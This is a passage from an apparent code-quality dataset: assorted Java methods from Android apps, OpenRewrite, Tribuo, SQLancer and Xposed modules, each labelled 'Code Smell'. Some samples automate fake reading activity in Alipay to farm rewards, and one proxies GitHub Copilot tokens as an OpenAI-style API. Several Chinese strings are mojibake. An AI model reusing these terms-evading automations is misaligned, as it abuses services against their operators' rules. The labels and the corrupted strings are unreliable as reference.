  if (!reactionsLayoutInBubble.isEmpty && (currentPosition == null || ((currentPosition.flags & MessageObject.POSITION_FLAG_BOTTOM) != 0 && (currentPosition.flags & MessageObject.POSITION_FLAG_LEFT) != 0)) && !reactionsLayoutInBubble.isSmall) {
    if (currentMessageObject.type == MessageObject.TYPE_EMOJIS || currentMessageObject.isAnimatedEmoji() || currentMessageObject.isAnyKindOfSticker()) {
      if (currentMessageObject.isOutOwner()) {
        reactionsLayoutInBubble.x=getMeasuredWidth() - reactionsLayoutInBubble.width - AndroidUtilities.dp(16);
      }
 else {
        reactionsLayoutInBubble.x=getCurrentBackgroundLeft();
      }
    }
 else {
      if (currentMessageObject.isOutOwner()) {
        reactionsLayoutInBubble.x=getCurrentBackgroundLeft() + AndroidUtilities.dp(11);
      }
 else {
        if (isRoundVideo) {
          reactionsLayoutInBubble.x=getCurrentBackgroundLeft() + AndroidUtilities.dp(11) + (int)AndroidUtilities.dp(AndroidUtilities.lerp(0,!drawPinnedBottom ? 6 : 0,getVideoTranscriptionProgress()));
          reactionsLayoutInBubble.x-=(int)((1f - getVideoTranscriptionProgress()) * AndroidUtilities.dp(9));
        }
 else {
          reactionsLayoutInBubble.x=getCurrentBackgroundLeft() + AndroidUtilities.dp(!mediaBackground && drawPinnedBottom ? 11 : 17);
          if (mediaBackground) {
            reactionsLayoutInBubble.x-=AndroidUtilities.dp(9);
          }
        }
      }
    }
    reactionsLayoutInBubble.y=getBackgroundDrawableBottom() - AndroidUtilities.dp(10) - reactionsLayoutInBubble.height;
    reactionsLayoutInBubble.y-=(drawCommentButton ? AndroidUtilities.dp(43) : 0);
    if (hasNewLineForTime && !(drawForwardedName && hasLinkPreview && documentAttachType == DOCUMENT_ATTACH_TYPE_AUDIO)) {
      reactionsLayoutInBubble.y-=AndroidUtilities.dp(16);
    }
    if (captionLayout != null && ((currentMessageObject.type != MessageObject.TYPE_VOICE && !(currentMessageObject.isOut() && drawForwardedName && !drawPhotoImage) && !(currentMessageObject.type == MessageObject.TYPE_FILE && drawPhotoImage)) || (currentPosition != null && currentMessagesGroup != null))) {
      reactionsLayoutInBubble.y-=AndroidUtilities.dp(14);
    }
    reactionsLayoutInBubble.y+=reactionsLayoutInBubble.positionOffsetY;
  }
  if (reactionsLayoutInBubble.isSmall && !reactionsLayoutInBubble.isEmpty) {
    int timeYOffset;
    if (shouldDrawTimeOnMedia()) {
      timeYOffset=-(drawCommentButton ? AndroidUtilities.dp(41.3f) : 0);
    }
 else {
      if (currentMessageObject.isSponsored()) {
        timeYOffset=-AndroidUtilities.dp(48);
        if (hasNewLineForTime) {
          timeYOffset-=AndroidUtilities.dp(16);
        }
      }
 else {
        timeYOffset=-(drawCommentButton ? AndroidUtilities.dp(43) : 0);
      }
    }
    reactionsLayoutInBubble.y=(int)(shouldDrawTimeOnMedia() ? photoImage.getImageY2() + additionalTimeOffsetY - AndroidUtilities.dp(7.3f) - timeLayout.getHeight() : layoutHeight - AndroidUtilities.dp(pinnedBottom || pinnedTop ? 7.5f : 6.5f) - timeLayout.getHeight() + timeYOffset);
    reactionsLayoutInBubble.y+=timeLayout.getHeight() / 2f - AndroidUtilities.dp(7);
    reactionsLayoutInBubble.x=(int)timeX;
  }
}",1,Code Smell
"public static ArrayList<WordInputEventForPersonalization> createInputEventFrom(final List<String> tokens,final int timestamp,final SpacingAndPunctuations spacingAndPunctuations,final Locale locale){
  final ArrayList<WordInputEventForPersonalization> inputEvents=new ArrayList<>();
  final int N=tokens.size();
  NgramContext ngramContext=NgramContext.EMPTY_PREV_WORDS_INFO;
  for (int i=0; i < N; ++i) {
    final String tempWord=tokens.get(i);
    if (StringUtils.isEmptyStringOrWhiteSpaces(tempWord)) {
      if (DEBUG_TOKEN) {
        Log.d(TAG,""--- isEmptyStringOrWhiteSpaces: \"""" + tempWord + ""\"""");
      }
      continue;
    }
    if (!DictionaryInfoUtils.looksValidForDictionaryInsertion(tempWord,spacingAndPunctuations)) {
      if (DEBUG_TOKEN) {
        Log.d(TAG,""--- not looksValidForDictionaryInsertion: \"""" + tempWord + ""\"""");
      }
      ngramContext=NgramContext.EMPTY_PREV_WORDS_INFO;
      continue;
    }
    if (DEBUG_TOKEN) {
      Log.d(TAG,""--- word: \"""" + tempWord + ""\"""");
    }
    final WordInputEventForPersonalization inputEvent=detectWhetherVaildWordOrNotAndGetInputEvent(ngramContext,tempWord,timestamp,locale);
    if (inputEvent == null) {
      continue;
    }
    inputEvents.add(inputEvent);
    ngramContext=ngramContext.getNextNgramContext(new NgramContext.WordInfo(tempWord));
  }
  return inputEvents;
}",1,Code Smell
"public static ThemeInfo fillThemeValues(File file,String themeName,TLRPC.TL_theme theme){
  try {
    ThemeInfo themeInfo=new ThemeInfo();
    themeInfo.name=themeName;
    themeInfo.info=theme;
    themeInfo.pathToFile=file.getAbsolutePath();
    themeInfo.account=UserConfig.selectedAccount;
    String[] wallpaperLink=new String[1];
    SparseIntArray colors=getThemeFileValues(new File(themeInfo.pathToFile),null,wallpaperLink);
    checkIsDark(colors,themeInfo);
    if (!TextUtils.isEmpty(wallpaperLink[0])) {
      String link=wallpaperLink[0];
      themeInfo.pathToWallpaper=new File(ApplicationLoader.getFilesDirFixed(),Utilities.MD5(link) + "".wp"").getAbsolutePath();
      try {
        Uri data=Uri.parse(link);
        themeInfo.slug=data.getQueryParameter(""slug"");
        String mode=data.getQueryParameter(""mode"");
        if (mode != null) {
          mode=mode.toLowerCase();
          String[] modes=mode.split("" "");
          if (modes != null && modes.length > 0) {
            for (int a=0; a < modes.length; a++) {
              if (""blur"".equals(modes[a])) {
                themeInfo.isBlured=true;
              }
 else               if (""motion"".equals(modes[a])) {
                themeInfo.isMotion=true;
              }
            }
          }
        }
        String intensity=data.getQueryParameter(""intensity"");
        if (!TextUtils.isEmpty(intensity)) {
          try {
            String bgColor=data.getQueryParameter(""bg_color"");
            if (!TextUtils.isEmpty(bgColor)) {
              themeInfo.patternBgColor=Integer.parseInt(bgColor.substring(0,6),16) | 0xff000000;
              if (bgColor.length() >= 13 && AndroidUtilities.isValidWallChar(bgColor.charAt(6))) {
                themeInfo.patternBgGradientColor1=Integer.parseInt(bgColor.substring(7,13),16) | 0xff000000;
              }
              if (bgColor.length() >= 20 && AndroidUtilities.isValidWallChar(bgColor.charAt(13))) {
                themeInfo.patternBgGradientColor2=Integer.parseInt(bgColor.substring(14,20),16) | 0xff000000;
              }
              if (bgColor.length() == 27 && AndroidUtilities.isValidWallChar(bgColor.charAt(20))) {
                themeInfo.patternBgGradientColor3=Integer.parseInt(bgColor.substring(21),16) | 0xff000000;
              }
            }
          }
 catch (          Exception ignore) {
          }
          try {
            String rotation=data.getQueryParameter(""rotation"");
            if (!TextUtils.isEmpty(rotation)) {
              themeInfo.patternBgGradientRotation=Utilities.parseInt(rotation);
            }
          }
 catch (          Exception ignore) {
          }
          if (!TextUtils.isEmpty(intensity)) {
            themeInfo.patternIntensity=Utilities.parseInt(intensity);
          }
          if (themeInfo.patternIntensity == 0) {
            themeInfo.patternIntensity=50;
          }
        }
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
    }
 else {
      themedWallpaperLink=null;
    }
    return themeInfo;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"private static Profile parse(String name,List<String> parents,Map<String,List<String>> tree,OptionSet optionSet) throws IllegalArgumentException {
  Profile.Builder builder=new Profile.Builder(name);
  List<String> options=tree.get(name);
  if (options == null) {
    throw new IllegalArgumentException(""Profile \"""" + name + ""\"" does not exist!"");
  }
  for (  String option : options) {
    if (option.startsWith(""!program."")) {
      builder.disableProgram(option.substring(""!program."".length()));
    }
 else     if (option.startsWith(""profile."")) {
      String dependency=option.substring(""profile."".length());
      if (parents.contains(dependency)) {
        throw new IllegalArgumentException(""Error parsing profile \"""" + name + ""\"", recursively included by: ""+ String.join("", "",parents));
      }
      parents.add(dependency);
      builder.addAll(parse(dependency,parents,tree,optionSet));
    }
 else     if (option.startsWith(""!"")) {
      builder.option(option.substring(1),""false"");
    }
 else     if (option.contains(""="")) {
      int splitPoint=option.indexOf(""="");
      builder.option(option.substring(0,splitPoint),option.substring(splitPoint + 1));
    }
 else     if (option.contains("":"")) {
      int splitPoint=option.indexOf("":"");
      builder.option(option.substring(0,splitPoint),option.substring(splitPoint + 1));
    }
 else     if (optionSet.isBooleanOption(option)) {
      builder.option(option,""true"");
    }
 else {
      Iris.logger.warn(""Invalid pack option: "" + option);
    }
  }
  return builder.build();
}",1,Code Smell
"public static CharSequence peerNameWithIcon(int currentAccount,TLRPC.Peer peer){
  return peerNameWithIcon(currentAccount,peer,!(peer instanceof TLRPC.TL_peerUser));
}
public static CharSequence peerNameWithIcon(int currentAccount,TLRPC.Peer peer,boolean anotherChat){
  if (peer instanceof TLRPC.TL_peerUser) {
    TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(peer.user_id);
    if (user != null) {
      if (anotherChat) {
        return new SpannableStringBuilder(userSpan()).append("" "").append(UserObject.getUserName(user));
      }
 else {
        return UserObject.getUserName(user);
      }
    }
  }
 else   if (peer instanceof TLRPC.TL_peerChat) {
    TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(peer.chat_id);
    if (chat != null) {
      if (anotherChat) {
        return new SpannableStringBuilder(ChatObject.isChannelAndNotMegaGroup(chat) ? channelSpan() : groupSpan()).append("" "").append(chat.title);
      }
 else {
        return chat.title;
      }
    }
  }
 else   if (peer instanceof TLRPC.TL_peerChannel) {
    TLRPC.Chat channel=MessagesController.getInstance(currentAccount).getChat(peer.channel_id);
    if (channel != null) {
      if (anotherChat) {
        return new SpannableStringBuilder(ChatObject.isChannelAndNotMegaGroup(channel) ? channelSpan() : groupSpan()).append("" "").append(channel.title);
      }
 else {
        return channel.title;
      }
    }
  }
  return """";
}
public static CharSequence peerNameWithIcon(int currentAccount,long did){
  return peerNameWithIcon(currentAccount,did,false);
}
public static CharSequence peerNameWithIcon(int currentAccount,long did,boolean anotherChat){
  if (did >= 0) {
    TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(did);
    if (user != null) {
      return UserObject.getUserName(user);
    }
  }
 else {
    TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-did);
    if (chat != null) {
      return new SpannableStringBuilder(ChatObject.isChannelAndNotMegaGroup(chat) ? channelSpan() : groupSpan()).append("" "").append(chat.title);
    }
  }
  return """";
}",1,Code Smell
"@Override protected void onCreatePrimaryActions(ArrayObjectAdapter primaryActionsAdapter){
  final long supportedActions=getSupportedActions();
  if ((supportedActions & ACTION_SKIP_TO_PREVIOUS) != 0 && mSkipPreviousAction == null) {
    primaryActionsAdapter.add(mSkipPreviousAction=new PlaybackControlsRow.SkipPreviousAction(getContext()));
  }
 else   if ((supportedActions & ACTION_SKIP_TO_PREVIOUS) == 0 && mSkipPreviousAction != null) {
    primaryActionsAdapter.remove(mSkipPreviousAction);
    mSkipPreviousAction=null;
  }
  if ((supportedActions & ACTION_REWIND) != 0 && mRewindAction == null) {
    primaryActionsAdapter.add(mRewindAction=new PlaybackControlsRow.RewindAction(getContext(),mRewindSpeeds.length));
  }
 else   if ((supportedActions & ACTION_REWIND) == 0 && mRewindAction != null) {
    primaryActionsAdapter.remove(mRewindAction);
    mRewindAction=null;
  }
  if ((supportedActions & ACTION_PLAY_PAUSE) != 0 && mPlayPauseAction == null) {
    mPlayPauseAction=new PlaybackControlsRow.PlayPauseAction(getContext());
    primaryActionsAdapter.add(mPlayPauseAction=new PlaybackControlsRow.PlayPauseAction(getContext()));
  }
 else   if ((supportedActions & ACTION_PLAY_PAUSE) == 0 && mPlayPauseAction != null) {
    primaryActionsAdapter.remove(mPlayPauseAction);
    mPlayPauseAction=null;
  }
  if ((supportedActions & ACTION_FAST_FORWARD) != 0 && mFastForwardAction == null) {
    mFastForwardAction=new PlaybackControlsRow.FastForwardAction(getContext(),mFastForwardSpeeds.length);
    primaryActionsAdapter.add(mFastForwardAction=new PlaybackControlsRow.FastForwardAction(getContext(),mFastForwardSpeeds.length));
  }
 else   if ((supportedActions & ACTION_FAST_FORWARD) == 0 && mFastForwardAction != null) {
    primaryActionsAdapter.remove(mFastForwardAction);
    mFastForwardAction=null;
  }
  if ((supportedActions & ACTION_SKIP_TO_NEXT) != 0 && mSkipNextAction == null) {
    primaryActionsAdapter.add(mSkipNextAction=new PlaybackControlsRow.SkipNextAction(getContext()));
  }
 else   if ((supportedActions & ACTION_SKIP_TO_NEXT) == 0 && mSkipNextAction != null) {
    primaryActionsAdapter.remove(mSkipNextAction);
    mSkipNextAction=null;
  }
}",1,Code Smell
"protected void visitModifier(Modifier mod,PrintOutputCapture<P> p){
  visit(mod.getAnnotations(),p);
  String keyword="""";
switch (mod.getType()) {
case Default:
    keyword=""default"";
  break;
case Public:
keyword=""public"";
break;
case Protected:
keyword=""protected"";
break;
case Private:
keyword=""private"";
break;
case Abstract:
keyword=""abstract"";
break;
case Static:
keyword=""static"";
break;
case Final:
keyword=""final"";
break;
case Native:
keyword=""native"";
break;
case NonSealed:
keyword=""non-sealed"";
break;
case Sealed:
keyword=""sealed"";
break;
case Strictfp:
keyword=""strictfp"";
break;
case Synchronized:
keyword=""synchronized"";
break;
case Transient:
keyword=""transient"";
break;
case Volatile:
keyword=""volatile"";
break;
}
beforeSyntax(mod,Space.Location.MODIFIER_PREFIX,p);
p.append(keyword);
afterSyntax(mod,p);
}
",1,Code Smell
"@Override public Prediction<Label> predict(Example<Label> example){
  SparseVector exVector=SparseVector.createSparseVector(example,featureIDMap,false);
  if (exVector.minValue() < 0.0) {
    throw new IllegalArgumentException(""Example has negative feature values, example = "" + example.toString());
  }
  if (exVector.numActiveElements() == 0) {
    throw new IllegalArgumentException(""No features found in Example "" + example.toString());
  }
  double[] alphaOffsets=new double[outputIDInfo.size()];
  int vocabSize=labelWordProbs.getDimension2Size();
  if (alpha > 0.0) {
    for (int i=0; i < outputIDInfo.size(); i++) {
      double unobservedProb=Math.log(alpha / (labelWordProbs.getRow(i).oneNorm() + (vocabSize * alpha)));
      int[] mismatchedIndices=exVector.difference(labelWordProbs.getRow(i));
      double inExampleFactor=0.0;
      for (int idx=0; idx < mismatchedIndices.length; idx++) {
        inExampleFactor+=exVector.get(mismatchedIndices[idx]) * unobservedProb;
      }
      alphaOffsets[i]=inExampleFactor;
    }
  }
  DenseVector prediction=labelWordProbs.leftMultiply(exVector);
  prediction.intersectAndAddInPlace(DenseVector.createDenseVector(alphaOffsets));
  prediction.normalize(normalizer);
  Map<String,Label> distribution=new LinkedHashMap<>();
  Label maxLabel=null;
  double maxScore=Double.NEGATIVE_INFINITY;
  for (  VectorTuple vt : prediction) {
    String name=outputIDInfo.getOutput(vt.index).getLabel();
    Label label=new Label(name,vt.value);
    if (vt.value > maxScore) {
      maxScore=vt.value;
      maxLabel=label;
    }
    distribution.put(name,label);
  }
  Prediction<Label> p=new Prediction<>(maxLabel,distribution,exVector.numActiveElements(),example,true);
  return p;
}",1,Code Smell
"@Override public void init(){
  if (!isAndroidU()) {
    String pluginLoaderClass=isAndroidT() ? ""com.android.systemui.shared.plugins.PluginInstance$Factory"" : ""com.android.systemui.shared.plugins.PluginManagerImpl"";
    hookAllMethods(pluginLoaderClass,""getClassLoader"",new MethodHook(){
      private boolean isHooked=false;
      @Override protected void after(      MethodHookParam param){
        appInfo=(ApplicationInfo)param.args[0];
        if (appInfo != null) {
          if (""miui.systemui.plugin"".equals(appInfo.packageName) && !isHooked) {
            isHooked=true;
            if (pluginLoader == null) {
              pluginLoader=(ClassLoader)param.getResult();
            }
            setClassLoader(pluginLoader);
          }
 else {
            if (!isHooked)             XposedLogUtils.logD(""appInfo is not miui.systemui.plugin is: "" + appInfo.packageName + "" isHooked: ""+ isHooked);
          }
        }
 else {
          XposedLogUtils.logE(TAG,""appInfo is null"");
        }
      }
    }
);
  }
 else {
    hookAllMethods(""com.android.systemui.shared.plugins.PluginInstance$Factory"",""create"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        appInfo=(ApplicationInfo)param.args[1];
      }
    }
);
    findAndHookMethod(""com.android.systemui.shared.plugins.PluginInstance$Factory$$ExternalSyntheticLambda0"",""get"",new MethodHook(){
      private boolean isHooked=false;
      @Override protected void after(      MethodHookParam param){
        Object pathClassLoader=param.getResult();
        if (appInfo != null) {
          if (""miui.systemui.plugin"".equals(appInfo.packageName) && !isHooked) {
            isHooked=true;
            if (pluginLoader == null) {
              pluginLoader=(ClassLoader)pathClassLoader;
            }
            setClassLoader(pluginLoader);
          }
 else {
            if (!isHooked)             XposedLogUtils.logD(""AU appInfo is not miui.systemui.plugin is: "" + appInfo.packageName + "" isHooked: ""+ isHooked);
          }
        }
 else {
          XposedLogUtils.logE(TAG,""AU appInfo is null"");
        }
      }
    }
);
  }
}",1,Code Smell
"private static void queryTaskCenterPage(){
  try {
    String s=AntBookReadRpcCall.queryTaskCenterPage();
    JSONObject jo=new JSONObject(s);
    if (jo.getBoolean(""success"")) {
      JSONObject data=jo.getJSONObject(""data"");
      String todayPlayDurationText=data.getJSONObject(""benefitAggBlock"").getString(""todayPlayDurationText"");
      int PlayDuration=Integer.parseInt(StringUtil.getSubString(todayPlayDurationText,""浠婃棩鍚鏃堕暱"",""鍒嗛挓""));
      if (PlayDuration < 450) {
        jo=new JSONObject(AntBookReadRpcCall.queryHomePage());
        if (jo.getBoolean(""success"")) {
          JSONArray bookList=jo.getJSONObject(""data"").getJSONArray(""dynamicCardList"").getJSONObject(0).getJSONObject(""data"").getJSONArray(""bookList"");
          int bookListLength=bookList.length();
          int postion=RandomUtils.nextInt(0,bookListLength - 1);
          JSONObject book=bookList.getJSONObject(postion);
          String bookId=book.getString(""bookId"");
          jo=new JSONObject(AntBookReadRpcCall.queryReaderContent(bookId));
          if (jo.getBoolean(""success"")) {
            String nextChapterId=jo.getJSONObject(""data"").getString(""nextChapterId"");
            String name=jo.getJSONObject(""data"").getJSONObject(""readerHomePageVO"").getString(""name"");
            for (int i=0; i < 17; i++) {
              int energy=0;
              jo=new JSONObject(AntBookReadRpcCall.syncUserReadInfo(bookId,nextChapterId));
              if (jo.getBoolean(""success"")) {
                jo=new JSONObject(AntBookReadRpcCall.queryReaderForestEnergyInfo(bookId));
                if (jo.getBoolean(""success"")) {
                  String tips=jo.getJSONObject(""data"").getString(""tips"");
                  if (tips.contains(""宸插緱"")) {
                    energy=Integer.parseInt(StringUtil.getSubString(tips,""宸插緱"",""g""));
                  }
                  Log.forest(""闃呰涔︾睄馃摎["" + name + ""]#绱鑳介噺""+ energy+ ""g"");
                }
              }
              if (energy >= 150) {
                break;
              }
 else {
                Thread.sleep(1500L);
              }
            }
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""resultDesc""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryTaskCenterPage err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"public static void initHookForFileProvider() throws ReflectiveOperationException {
  if (sIsHooked) {
    return;
  }
  ClassLoader classLoader=Initiator.getHostClassLoader();
  Class<?> supportFileProvider=null;
  Class<?> androidxFileProvider=null;
  try {
    supportFileProvider=classLoader.loadClass(""android.support.v4.content.FileProvider"");
  }
 catch (  ClassNotFoundException e) {
  }
  try {
    androidxFileProvider=classLoader.loadClass(""androidx.core.content.FileProvider"");
  }
 catch (  ClassNotFoundException e) {
  }
  Method supportOpenFile=null;
  Method supportQuery=null;
  Method androidxOpenFile=null;
  Method androidxQuery=null;
  if (supportFileProvider != null) {
    supportOpenFile=supportFileProvider.getDeclaredMethod(""openFile"",Uri.class,String.class);
    supportQuery=supportFileProvider.getDeclaredMethod(""query"",Uri.class,String[].class,String.class,String[].class,String.class);
  }
  if (androidxFileProvider != null) {
    androidxOpenFile=androidxFileProvider.getDeclaredMethod(""openFile"",Uri.class,String.class);
    androidxQuery=androidxFileProvider.getDeclaredMethod(""query"",Uri.class,String[].class,String.class,String[].class,String.class);
  }
  String targetAuthority=HostInfo.getPackageName() + "".fileprovider"";
  XC_MethodHook hookOpenFile=new XC_MethodHook(51){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      Uri uri=(Uri)param.args[0];
      String mode=(String)param.args[1];
      if (targetAuthority.equals(uri.getAuthority())) {
        String[] path=getUriPathHierarchy(uri);
        if (path.length != 0 && ""qauxv"".equals(path[0])) {
          try {
            param.setResult(doOnOpenFile(uri,mode));
          }
 catch (          FileNotFoundException e) {
            param.setThrowable(e);
          }
        }
      }
    }
  }
;
  XC_MethodHook hookQuery=new XC_MethodHook(51){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      Uri uri=(Uri)param.args[0];
      String[] projection=(String[])param.args[1];
      String selection=(String)param.args[2];
      String[] selectionArgs=(String[])param.args[3];
      String sortOrder=(String)param.args[4];
      if (targetAuthority.equals(uri.getAuthority())) {
        String[] path=getUriPathHierarchy(uri);
        if (path.length != 0 && ""qauxv"".equals(path[0])) {
          param.setResult(doOnQuery(uri,projection,selection,selectionArgs,sortOrder));
        }
      }
    }
  }
;
  if (supportOpenFile != null) {
    XposedBridge.hookMethod(supportOpenFile,hookOpenFile);
  }
  if (androidxOpenFile != null) {
    XposedBridge.hookMethod(androidxOpenFile,hookOpenFile);
  }
  if (supportQuery != null) {
    XposedBridge.hookMethod(supportQuery,hookQuery);
  }
  if (androidxQuery != null) {
    XposedBridge.hookMethod(androidxQuery,hookQuery);
  }
  sIsHooked=true;
}",1,Code Smell
"/** 
 * 璇锋眰浣撲笉鏄痡son 浼氭姤Request body is missing or not in JSON format Authorization token缂哄け  浼氭姤Authorization header is missing 鏃犳硶璇锋眰鍒癱hat_token 浼氭姤copilot APIKey is wrong
 * @param response
 * @param request
 * @param conversation
 * @return
 * @throws JSONException
 * @throws IOException
 */
@PostMapping(value=""/v1/chat/completions"") public CompletableFuture<ResponseEntity<String>> coPilotConversation(HttpServletResponse response,HttpServletRequest request,@org.springframework.web.bind.annotation.RequestBody Conversation conversation){
  return CompletableFuture.supplyAsync(() -> {
    try {
      if (conversation == null) {
        return new ResponseEntity<>(""Request body is missing or not in JSON format"",HttpStatus.BAD_REQUEST);
      }
      String authorizationHeader=StringUtils.trimToNull(request.getHeader(""Authorization""));
      String apiKey;
      if (authorizationHeader != null && authorizationHeader.startsWith(""Bearer "")) {
        apiKey=authorizationHeader.substring(7);
      }
 else {
        return new ResponseEntity<>(""Authorization header is missing"",HttpStatus.UNAUTHORIZED);
      }
      if (!copilotTokenList.containsKey(apiKey)) {
        String token=getCopilotToken(apiKey);
        if (token == null) {
          return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
        }
        copilotTokenList.put(apiKey,token);
        log.info(""coCopilotTokenList鍒濆鍖栨垚鍔燂紒"");
      }
      String chat_token=copilotTokenList.get(apiKey);
      Map<String,String> headersMap=new HashMap<>();
      addHeader(headersMap,chat_token);
      String json=com.alibaba.fastjson2.JSON.toJSONString(conversation);
      MediaType JSON=MediaType.get(""application/json; charset=utf-8"");
      RequestBody requestBody=RequestBody.create(json,JSON);
      Request.Builder requestBuilder=new Request.Builder().url(""https://api.githubcopilot.com/chat/completions"").post(requestBody);
      headersMap.forEach(requestBuilder::addHeader);
      Request streamRequest=requestBuilder.build();
      try (Response resp=client.newCall(streamRequest).execute()){
        if (!resp.isSuccessful()) {
          if (resp.code() == 429) {
            return new ResponseEntity<>(""rate limit exceeded"",HttpStatus.TOO_MANY_REQUESTS);
          }
 else {
            String token=getCopilotToken(apiKey);
            if (token == null) {
              return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
            }
            copilotTokenList.put(apiKey,token);
            log.info(""token杩囨湡锛宑oCopilotTokenList閲嶇疆鍖栨垚鍔燂紒"");
            againConversation(response,conversation,token);
          }
        }
 else {
          outPutChat(response,resp,conversation);
          addModel(conversation);
        }
      }
     }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
    return null;
  }
,executor).orTimeout(6,TimeUnit.MINUTES).exceptionally(ex -> {
    if (ex instanceof TimeoutException) {
      return new ResponseEntity<>(""Request timed out"",HttpStatus.REQUEST_TIMEOUT);
    }
 else {
      return new ResponseEntity<>(""An error occurred"",HttpStatus.INTERNAL_SERVER_ERROR);
    }
  }
);
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public boolean hurt(DamageSource source,float amount){
  if (this.isInvulnerableTo(source)) {
    return false;
  }
 else   if (this.abilities.invulnerable && !source.is(DamageTypeTags.BYPASSES_INVULNERABILITY)) {
    return false;
  }
 else {
    this.noActionTime=0;
    if (this.getHealth() <= 0.0F) {
      return false;
    }
 else {
      if (source.scalesWithDifficulty()) {
        if (this.level().getDifficulty() == Difficulty.PEACEFUL) {
          return false;
        }
        if (this.level().getDifficulty() == Difficulty.EASY) {
          amount=Math.min(amount / 2.0F + 1.0F,amount);
        }
        if (this.level().getDifficulty() == Difficulty.HARD) {
          amount=amount * 3.0F / 2.0F;
        }
      }
      boolean damaged=super.hurt(source,amount);
      if (damaged) {
        this.removeEntitiesOnShoulder();
      }
      return damaged;
    }
  }
}",1,Code Smell
"private int getMovement(int direction){
  int movement=View.FOCUS_LEFT;
  if (mOrientation == HORIZONTAL) {
switch (direction) {
case View.FOCUS_LEFT:
      movement=(mFlag & PF_REVERSE_FLOW_PRIMARY) == 0 ? PREV_ITEM : NEXT_ITEM;
    break;
case View.FOCUS_RIGHT:
  movement=(mFlag & PF_REVERSE_FLOW_PRIMARY) == 0 ? NEXT_ITEM : PREV_ITEM;
break;
case View.FOCUS_UP:
movement=PREV_ROW;
break;
case View.FOCUS_DOWN:
movement=NEXT_ROW;
break;
}
}
 else if (mOrientation == VERTICAL) {
switch (direction) {
case View.FOCUS_LEFT:
movement=(mFlag & PF_REVERSE_FLOW_SECONDARY) == 0 ? PREV_ROW : NEXT_ROW;
break;
case View.FOCUS_RIGHT:
movement=(mFlag & PF_REVERSE_FLOW_SECONDARY) == 0 ? NEXT_ROW : PREV_ROW;
break;
case View.FOCUS_UP:
movement=PREV_ITEM;
break;
case View.FOCUS_DOWN:
movement=NEXT_ITEM;
break;
}
}
return movement;
}",1,Code Smell
"public static PostgresSelect createRandomQuery(int nrColumns,PostgresGlobalState globalState){
  List<PostgresExpression> columns=new ArrayList<>();
  PostgresTables tables=globalState.getSchema().getRandomTableNonEmptyTables();
  PostgresExpressionGenerator gen=new PostgresExpressionGenerator(globalState).setColumns(tables.getColumns());
  for (int i=0; i < nrColumns; i++) {
    columns.add(gen.generateExpression(0));
  }
  PostgresSelect select=new PostgresSelect();
  select.setSelectType(SelectType.getRandom());
  if (select.getSelectOption() == SelectType.DISTINCT && Randomly.getBoolean()) {
    select.setDistinctOnClause(gen.generateExpression(0));
  }
  select.setFromList(tables.getTables().stream().map(t -> new PostgresFromTable(t,Randomly.getBoolean())).collect(Collectors.toList()));
  select.setFetchColumns(columns);
  if (Randomly.getBoolean()) {
    select.setWhereClause(gen.generateExpression(0,PostgresDataType.BOOLEAN));
  }
  if (Randomly.getBooleanWithRatherLowProbability()) {
    select.setGroupByExpressions(gen.generateExpressions(Randomly.smallNumber() + 1));
    if (Randomly.getBoolean()) {
      select.setHavingClause(gen.generateHavingClause());
    }
  }
  if (Randomly.getBooleanWithRatherLowProbability()) {
    select.setOrderByClauses(gen.generateOrderBy());
  }
  if (Randomly.getBoolean()) {
    select.setLimitClause(PostgresConstant.createIntConstant(Randomly.getPositiveOrZeroNonCachedInteger()));
    if (Randomly.getBoolean()) {
      select.setOffsetClause(PostgresConstant.createIntConstant(Randomly.getPositiveOrZeroNonCachedInteger()));
    }
  }
  if (Randomly.getBooleanWithRatherLowProbability()) {
    select.setForClause(ForClause.getRandom());
  }
  return select;
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!dependencyDsl.matches(m) || !(StringUtils.isBlank(configuration) || m.getSimpleName().equals(configuration))) {
    return m;
  }
  List<Expression> depArgs=m.getArguments();
  if (depArgs.get(0) instanceof J.Literal) {
    String gav=(String)((J.Literal)depArgs.get(0)).getValue();
    if (gav != null) {
      Dependency dependency=DependencyStringNotationConverter.parse(gav);
      if (dependency.getVersion() != null && dependency.getClassifier() != null && !newClassifier.equals(dependency.getClassifier()) && depMatcher.matches(dependency.getGroupId(),dependency.getArtifactId(),dependency.getVersion())) {
        Dependency newDependency=dependency.withClassifier(newClassifier);
        m=m.withArguments(ListUtils.mapFirst(m.getArguments(),arg -> ChangeStringLiteral.withStringValue((J.Literal)arg,newDependency.toStringNotation())));
      }
    }
  }
 else   if (depArgs.get(0) instanceof G.MapEntry) {
    G.MapEntry classifierEntry=null;
    String groupId=null;
    String artifactId=null;
    String version=null;
    String classifier=null;
    String classifierStringDelimiter=""'"";
    for (    Expression e : depArgs) {
      if (!(e instanceof G.MapEntry)) {
        continue;
      }
      G.MapEntry arg=(G.MapEntry)e;
      if (!(arg.getKey() instanceof J.Literal) || !(arg.getValue() instanceof J.Literal)) {
        continue;
      }
      J.Literal key=(J.Literal)arg.getKey();
      J.Literal value=(J.Literal)arg.getValue();
      if (!(key.getValue() instanceof String) || !(value.getValue() instanceof String)) {
        continue;
      }
      String keyValue=(String)key.getValue();
      String valueValue=(String)value.getValue();
      if (""group"".equals(keyValue)) {
        groupId=valueValue;
      }
 else       if (""name"".equals(keyValue)) {
        artifactId=valueValue;
      }
 else       if (""version"".equals(keyValue)) {
        version=valueValue;
      }
 else       if (""classifier"".equals(keyValue) && !newClassifier.equals(valueValue)) {
        if (value.getValueSource() != null) {
